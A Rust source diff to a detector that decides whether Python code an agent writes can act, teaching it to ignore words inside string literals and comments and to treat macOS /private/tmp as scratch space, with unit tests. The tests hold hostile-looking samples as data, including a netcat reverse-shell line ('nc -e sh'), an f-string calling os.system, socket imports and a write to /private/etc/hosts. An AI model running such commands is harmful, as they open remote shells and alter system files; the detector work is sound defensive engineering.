@@ -717,7 +717,14 @@ pub(crate) fn code_may_act(
             .iter()
             .any(|word| lower.contains(word));
     }
-    if PYTHON_RUNS.iter().any(|word| lower.contains(word)) {
+    // A word of the list inside a string literal or a comment runs nothing:
+    // an edit of a detector's source that replaces text naming `socket`,
+    // `exec(` or `environ` calls none of them. What makes a string run is a
+    // call written outside it (`exec(`, `eval(`, `getattr(`,
+    // `__import__`, `importlib`), still read here; an f-string is code
+    // between its braces and is read whole ([`python_outside_strings`]).
+    let outside = without_scope_statements(&python_outside_strings(&lower));
+    if PYTHON_RUNS.iter().any(|word| outside.contains(word)) {
         return true;
     }
     // A name spelled with escapes (`'\163ystem'`, `'\x73ystem'`) is one the
@@ -735,6 +742,156 @@ pub(crate) fn code_may_act(
             .all(|target| project_path(target, relative_ok)),
         None => true,
     }
+}
+
+/// Python `code` with the text of every string literal and of every comment
+/// replaced by blanks, the quotes kept (`s.replace('exec(x)', y)` reads
+/// `s.replace('       ', y)`, and `Path.home() / '.x'` still reads `) / '`).
+/// An f-string is kept whole: what stands between its braces runs. A
+/// literal the code never closes keeps the rest of the code as written.
+fn python_outside_strings(code: &str) -> String {
+    let chars: Vec<char> = code.chars().collect();
+    let mut out = String::with_capacity(code.len());
+    let mut at = 0;
+    while at < chars.len() {
+        let c = chars[at];
+        if c == '#' {
+            while at < chars.len() && chars[at] != '\n' {
+                out.push(' ');
+                at += 1;
+            }
+            continue;
+        }
+        if c != '\'' && c != '"' {
+            out.push(c);
+            at += 1;
+            continue;
+        }
+        let triple = chars.get(at + 1) == Some(&c) && chars.get(at + 2) == Some(&c);
+        let f = python_string_prefix(&chars, at).contains('f');
+        match python_string_end(&chars, at, c, triple, f, 0) {
+            Some(end) if !f => {
+                let open = if triple { 3 } else { 1 };
+                for (index, ch) in chars[at..end].iter().enumerate() {
+                    let delimiter = index < open || index >= end - at - open;
+                    out.push(if delimiter || *ch == '\n' { *ch } else { ' ' });
+                }
+                at = end;
+            }
+            end => {
+                let stop = end.unwrap_or(chars.len());
+                out.extend(&chars[at..stop]);
+                at = stop;
+            }
+        }
+    }
+    out
+}
+
+/// Python code with its `global` and `nonlocal` statements blanked: they
+/// name variables of the code, never a module, and `global s` read as text
+/// holds `glob` (measured 2026-11-28: every edit script of a week that
+/// rebinds its text in a helper was read as code that lists files).
+fn without_scope_statements(code: &str) -> String {
+    static SCOPE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
+    let scope = SCOPE.get_or_init(|| {
+        regex::Regex::new(r"(?m)(^|;)([ \t]*)(?:global|nonlocal)[ \t]+([a-z_][a-z0-9_]*(?:[ \t]*,[ \t]*[a-z_][a-z0-9_]*)*)[ \t]*$")
+            .expect("static scope statement regex")
+    });
+    scope
+        .replace_all(code, |found: &regex::Captures<'_>| {
+            format!(
+                "{}{}{}",
+                &found[1],
+                &found[2],
+                " ".repeat(found[0].len() - found[1].len() - found[2].len())
+            )
+        })
+        .into_owned()
+}
+
+/// How many strings inside the braces of f-strings inside one another
+/// [`python_string_end`] follows.
+const PYTHON_STRING_NESTING: usize = 8;
+
+/// The prefix letters of the Python string literal whose quote is at `at`
+/// (`f`, `rb`, `fr`), lowercase; empty when the letters before the quote
+/// end a name instead (`x'`... is no literal of Python).
+fn python_string_prefix(chars: &[char], at: usize) -> String {
+    let mut start = at;
+    while start > 0 && at - start < 2 && "rbufRBUF".contains(chars[start - 1]) {
+        start -= 1;
+    }
+    if start > 0 && (chars[start - 1].is_alphanumeric() || chars[start - 1] == '_') {
+        return String::new();
+    }
+    chars[start..at]
+        .iter()
+        .collect::<String>()
+        .to_ascii_lowercase()
+}
+
+/// Where the Python string literal opened at `start` by `quote` (three of
+/// them when `triple`) ends: the index after its closing quote, or `None`
+/// when the code does not close it. In an f-string (`f`) a quote inside
+/// the braces opens a string of its own; past [`PYTHON_STRING_NESTING`]
+/// such strings inside one another the literal is taken as not closed, so
+/// the rest of the code is read as written and the reading never runs out
+/// of stack.
+fn python_string_end(
+    chars: &[char],
+    start: usize,
+    quote: char,
+    triple: bool,
+    f: bool,
+    nesting: usize,
+) -> Option<usize> {
+    if nesting > PYTHON_STRING_NESTING {
+        return None;
+    }
+    let open = if triple { 3 } else { 1 };
+    let mut at = start + open;
+    let mut depth = 0usize;
+    while at < chars.len() {
+        let c = chars[at];
+        if depth > 0 {
+            match c {
+                '{' => depth += 1,
+                '}' => depth -= 1,
+                '\'' | '"' => {
+                    let nested_triple =
+                        chars.get(at + 1) == Some(&c) && chars.get(at + 2) == Some(&c);
+                    let nested_f = python_string_prefix(chars, at).contains('f');
+                    at = python_string_end(chars, at, c, nested_triple, nested_f, nesting + 1)?;
+                    continue;
+                }
+                _ => {}
+            }
+            at += 1;
+            continue;
+        }
+        if c == '\\' {
+            at += 2;
+            continue;
+        }
+        if !triple && c == '\n' {
+            return None;
+        }
+        if c == quote
+            && (!triple || (chars.get(at + 1) == Some(&quote) && chars.get(at + 2) == Some(&quote)))
+        {
+            return Some(at + open);
+        }
+        if f && c == '{' {
+            if chars.get(at + 1) == Some(&'{') {
+                at += 2;
+                continue;
+            }
+            depth = 1;
+        }
+        at += 1;
+    }
+    None
 }
 
 /// Whether code holds one of [`OTHER_RUNS`]. `system` counts only as a word
@@ -964,7 +1121,9 @@ fn project_path(path: &str, relative_ok: bool) -> bool {
             return false;
         }
         let rest = if lower.starts_with('/') {
-            let Some(rest) = ["/tmp/", "/home/", "/users/"]
+            // `/private/tmp` is `/tmp` on macOS, where an agent's scratch
+            // folder is spelled that way.
+            let Some(rest) = ["/tmp/", "/private/tmp/", "/home/", "/users/"]
                 .iter()
                 .find_map(|root| lower.strip_prefix(root))
             else {
@@ -1903,6 +2062,7 @@ fn work_folder(folder: &str) -> bool {
         .strip_prefix("~/")
         .or_else(|| lower.strip_prefix("$home/"))
         .or_else(|| lower.strip_prefix("/tmp/"))
+        .or_else(|| lower.strip_prefix("/private/tmp/"))
     {
         (rest, false)
     } else if let Some(rest) = lower
@@ -2357,7 +2517,64 @@ fn replace_ignoring_case(text: &str, needle: &str, with: &str) -> String {
 
 #[cfg(test)]
 mod tests {
-    use super::{code_may_act, masked, work_folder_path};
+    use super::{code_may_act, masked, python_outside_strings, work_folder_path};
+
+    /// A word that runs something, written inside a string literal or a
+    /// comment of Python, runs nothing; written outside one, or between the
+    /// braces of an f-string, it does.
+    ///
+    /// FAILS ON REVERT of the string reading in [`code_may_act`]: an edit
+    /// of source text naming `socket` or `exec(` was read as code that acts.
+    #[test]
+    fn python_words_inside_strings_run_nothing() {
+        let quiet = [
+            "p='src/net.rs'\ns=open(p).read()\ns=s.replace('// end', 'opens a socket, calls exec(x)\\n// end')\nopen(p,'w').write(s)\n",
+            "p='docs/a.md'\ns=open(p).read()\ns=s.replace('''x''', '''uses \"subprocess\" and 'environ'\n''')\nopen(p,'w').write(s)\n",
+            "p='docs/a.md'\n# reads os.environ, imports socket\nopen(p,'a').write('y')\n",
+            "p='docs/a.md'\nopen(p,'a').write(r'\\'socket\\' ' + b\"exec(\".decode())\n",
+            // A scratch file under macOS's spelling of `/tmp`.
+            "open('/private/tmp/s1/scratchpad/notes.py','w').write('nc -e sh h1 1')\n",
+            // `global s` holds `glob`, and names a variable.
+            "p='src/a.rs'\ns=open(p).read()\ndef rep(a, b):\n    global s\n    s=s.replace(a, b)\nrep('x', 'y')\nopen(p,'w').write(s)\n",
+        ];
+        for code in quiet {
+            assert!(
+                !code_may_act(code, &[], false, "python", true),
+                "read as acting: {code}"
+            );
+        }
+        let acts = [
+            "import socket\n",
+            "exec('print(1)')\n",
+            "s='x'\nopen('docs/a.md','w').write(f\"{__import__('os').system('id')}\")\n",
+            "open('docs/a.md','w').write(f'{x[\"a\"]}' + getattr(o, 'n')())\n",
+            "s='never closed\nimport socket\n",
+            "import glob\nfor p in glob.glob('*.md'): open(p,'a').write('x')\n",
+            "open('/private/etc/hosts','a').write('x')\n",
+            "s='''never closed\nimport socket\n",
+            "open('docs/a.md','w').write('a'); eval('1')  # the call is outside\n",
+        ];
+        for code in acts {
+            assert!(
+                code_may_act(code, &[], false, "python", true),
+                "read as quiet: {code}"
+            );
+        }
+    }
+
+    /// Strings inside the braces of f-strings inside one another, past the
+    /// nesting followed, leave the rest of the code as written: nothing it
+    /// holds is blanked, and the reading returns.
+    #[test]
+    fn deep_f_strings_are_read_as_written() {
+        let mut code = String::from("x=");
+        for _ in 0..200 {
+            code.push_str("f'{");
+        }
+        code.push_str("socket");
+        let read = python_outside_strings(&code);
+        assert!(read.contains("socket"), "{read}");
+    }
 
     /// FAILS ON REVERT of [`super::output_stays`]: each slot was masked
     /// though its output is run.
